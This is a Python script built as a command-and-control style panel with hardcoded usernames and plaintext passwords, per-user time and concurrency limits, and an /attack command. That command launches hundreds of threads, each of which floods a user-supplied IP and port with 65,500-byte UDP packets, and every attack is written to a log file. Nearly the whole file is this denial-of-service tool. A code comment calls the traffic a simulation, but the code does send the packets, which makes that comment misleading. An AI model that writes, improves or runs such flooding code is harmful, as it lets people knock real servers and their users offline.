import os
import threading
import time
import socket
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# Users and limits
users = {
    "Zjoch": {"pass": "Test", "concu": 1, "time": 60},
    "zSky": {"pass": "Zsky", "concu": 1, "time": 60},
    "lulumina": {"pass": "luluadmin", "concu": 2, "time": 300}
}

# Track if user is attacking
user_attacks = {}

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_red(text):
    print(Fore.RED + text + Style.RESET_ALL)

def attack_banner():
    banner = """
   ▗▄▖▗▄▄▄▖▗▄▄▄▖▗▄▖  ▗▄▄▖▗▖ ▗▖     ▗▄▄▖▗▄▄▄▖▗▖  ▗▖▗▄▄▄▖
  ▐▌ ▐▌ █    █ ▐▌ ▐▌▐▌   ▐▌▗▞▘    ▐▌   ▐▌   ▐▛▚▖▐▌  █  
  ▐▛▀▜▌ █    █ ▐▛▀▜▌▐▌   ▐▛▚▖      ▝▀▚▖▐▛▀▀▘▐▌ ▝▜▌  █  
  ▐▌ ▐▌ █    █ ▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌    ▗▄▄▞▘▐▙▄▄▖▐▌  ▐▌  █
"""
    print(Fore.RED + banner + Style.RESET_ALL)

def send_attack(ip, port, method, conc, attack_time):
    # Check if the IP is localhost
    if ip == "127.0.0.1":
        print_red("[!] Cannot attack localhost IP (127.0.0.1).")
        return

    user_attacks["lulumina"] = True
    clear_screen()
    attack_banner()

    print_red(f"IP: {ip}")
    print_red(f"PORT: {port}")
    print_red(f"TIME: {attack_time}s")
    print_red(f"METHOD: {method}")
    print_red(f"CONCURRENTS: {conc}")
    print_red("PLAN: VIP\n")

    def flood():
        end_time = time.time() + attack_time
        while time.time() < end_time:
            try:
                # Simulate sending 65500 bytes of data (realistic payload, for demo purposes)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(bytes(65500), (ip, port))
                time.sleep(0.01)  # Sleep to simulate 100 threads per second
            except Exception as e:
                print_red(f"[!] Error during attack: {e}")

    threads = []
    for _ in range(conc * 100):  # Number of threads: conc * 100 (based on user input for concurrency)
        t = threading.Thread(target=flood)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    log_attack(ip, port, method, conc, attack_time)

    print_red("\n[+] Attack finished.\n")
    user_attacks["lulumina"] = False
    time.sleep(2)
    main()

def log_attack(ip, port, method, conc, attack_time):
    with open("attack_log.txt", "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] IP: {ip} | PORT: {port} | METHOD: {method} | CONCURRENTS: {conc} | TIME: {attack_time}s\n")

def command_shell(username):
    print_red("末端攻撃を実行した。")
    print_red("C2: lulumina, zjoch\n")

    prompt = f"{Fore.RED + username + Style.RESET_ALL}•C2>> "

    while True:
        if user_attacks.get(username, False):
            print_red("[!] Waiting for the attack to finish...")
            time.sleep(1)
            continue

        cmd = input(prompt).strip()

        if cmd == "/help":
            print_red("/attack [ip] [port] [method] [concurrents] [time]")
            print_red("/methods")
            print_red("/log (only lulumina can use this)")

        elif cmd == "/methods":
            print_red("Available methods: UDPPPS, UDPGOOD")

        elif cmd.startswith("/attack"):
            parts = cmd.split()
            if len(parts) != 6:
                print_red("[!] Usage: /attack [ip] [port] [method] [concurrents] [time]")
                continue

            ip, port, method, conc, attack_time = parts[1], parts[2], parts[3], parts[4], parts[5]
            if not conc.isdigit() or not attack_time.isdigit():
                print_red("[!] Concurrents and time must be numbers.")
                continue

            conc = int(conc)
            attack_time = int(attack_time)

            max_conc = users[username]["concu"]
            max_time = users[username]["time"]

            if conc > max_conc:
                print_red(f"[!] You are allowed a maximum of {max_conc} concurrent(s).")
                continue
            if attack_time > max_time:
                print_red(f"[!] Maximum allowed time is {max_time} seconds.")
                continue

            threading.Thread(target=send_attack, args=(ip, port, method, conc, attack_time)).start()
            break

        elif cmd == "/log" and username == "lulumina":
            # Only lulumina can view the logs
            with open("attack_log.txt", "r") as f:
                logs = f.readlines()
                if logs:
                    print_red("\n[Attack Logs]:")
                    for line in logs:
                        print(line.strip())
                else:
                    print_red("[!] No attack logs found.")
        
        else:
            print_red("[!] Unknown command.")

def main():
    clear_screen()
    print("username:")
    username = input().strip()
    print("password:")
    password = input().strip()

    if username in users and users[username]["pass"] == password:
        command_shell(username)
    else:
        print_red("[!] Invalid credentials.")
        time.sleep(2)
        main()

if __name__ == "__main__":
    main()
